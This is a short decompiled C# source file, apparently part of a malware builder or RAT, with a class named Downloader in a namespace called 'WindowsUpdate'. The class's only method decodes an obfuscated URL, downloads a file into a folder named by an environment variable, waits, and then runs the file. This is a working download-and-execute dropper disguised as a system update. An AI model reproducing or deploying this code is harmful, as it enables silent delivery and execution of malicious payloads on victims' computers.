using System.Diagnostics;
using System.Net;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsUpdate;

public class Downloader
{
	[DebuggerNonUserCode]
	public Downloader()
	{
	}

	public void StartDownlaoder(string DownloadURL, string DownloadPath, string DownloadName, string SleepTimer)
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFile(A.DEB(ref DownloadURL), Interaction.Environ(DownloadPath) + "\\" + DownloadName);
		Thread.Sleep(Conversions.ToInteger(SleepTimer));
		Process.Start(Interaction.Environ(DownloadPath) + "\\" + DownloadName);
	}
}
